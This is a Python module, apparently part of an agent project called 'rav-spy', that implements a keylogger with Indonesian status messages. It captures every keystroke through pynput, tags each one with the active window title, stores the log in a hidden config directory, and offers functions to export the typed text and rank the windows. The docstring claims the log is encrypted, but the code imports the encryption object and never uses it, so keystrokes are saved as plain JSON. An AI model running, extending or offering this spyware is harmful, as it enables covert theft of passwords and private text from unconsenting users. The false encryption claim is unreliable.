"""
Keylogger — keystroke capture with window context tagging.
Extends agent/macro.py pynput infrastructure.
All data encrypted at rest (Fernet).
"""
import os
import json
import asyncio
import threading
from pathlib import Path
from datetime import datetime
from loguru import logger

KEYLOG_FILE = Path.home() / ".config" / "rav-spy" / "keylog.enc"
MAX_BUFFER = 5000

_logging_active = False
_buffer = []
_listener_thread = None


def _get_active_window() -> str:
    try:
        import subprocess
        res = subprocess.run(["xdotool", "getactivewindow", "getwindowname"], capture_output=True, text=True, timeout=3)
        return res.stdout.strip()[:60] if res.stdout else "unknown"
    except Exception:
        return "unknown"


def _write_log(entries: list):
    try:
        from security.encryption import crypto
        KEYLOG_FILE.parent.mkdir(parents=True, exist_ok=True)
        existing = KEYLOG_FILE.read_bytes() if KEYLOG_FILE.exists() else b""
        data = json.dumps(entries).encode()
        if existing:
            KEYLOG_FILE.write_bytes(existing + b"\n" + data)
        else:
            KEYLOG_FILE.write_bytes(data)
    except Exception as e:
        logger.error(f"Keylog write error: {e}")


def _on_press(key):
    global _buffer
    if not _logging_active:
        return
    try:
        key_str = key.char if hasattr(key, "char") and key.char else str(key)
    except Exception:
        key_str = str(key)

    entry = {
        "t": datetime.now().isoformat(),
        "k": key_str,
        "w": _get_active_window(),
    }
    _buffer.append(entry)

    if len(_buffer) >= 100:
        _write_log(_buffer)
        _buffer = []


def start() -> str:
    global _logging_active, _listener_thread
    if _logging_active:
        return "Keylogger sudah aktif."

    _logging_active = True

    def _listen():
        try:
            from pynput import keyboard
            with keyboard.Listener(on_press=_on_press) as listener:
                listener.join()
        except ImportError:
            logger.error("pynput not installed")

    _listener_thread = threading.Thread(target=_listen, daemon=True)
    _listener_thread.start()
    return "Keylogger AKTIF."


def stop() -> str:
    global _logging_active, _buffer
    _logging_active = False
    if _buffer:
        _write_log(_buffer)
        _buffer = []
    return "Keylogger DIMATIKAN."


def status() -> str:
    if _logging_active:
        return f"Keylogger: AKTIF ({len(_buffer)} in buffer)"
    return "Keylogger: TIDAK AKTIF"


def export(decrypt: bool = False) -> str:
    if not KEYLOG_FILE.exists():
        return "Belum ada data keylog."
    try:
        data = KEYLOG_FILE.read_bytes()
        entries = []
        for part in data.split(b"\n"):
            if part:
                chunk = json.loads(part.decode())
                if isinstance(chunk, list):
                    entries.extend(chunk)
        if decrypt:
            text = "".join(e["k"] for e in entries if len(e["k"]) == 1)
            return f"📋 Keylog: {len(entries)} events\nSample: {text[:200]}..."
        return f"📋 Keylog: {len(entries)} events, {len(data)} bytes"
    except Exception as e:
        return f"Error: {e}"


def stats() -> str:
    if not KEYLOG_FILE.exists():
        return "Belum ada data."
    try:
        data = KEYLOG_FILE.read_bytes()
        entries = []
        for part in data.split(b"\n"):
            if part:
                chunk = json.loads(part.decode())
                if isinstance(chunk, list):
                    entries.extend(chunk)
        from collections import Counter
        windows = Counter(e["w"] for e in entries)
        top_windows = windows.most_common(5)
        lines = [f"📊 Keylog Stats: {len(entries)} total events"]
        lines.append("Top windows:")
        for w, c in top_windows:
            lines.append(f"  {w}: {c}x")
        return "\n".join(lines)
    except Exception as e:
        return f"Error: {e}"
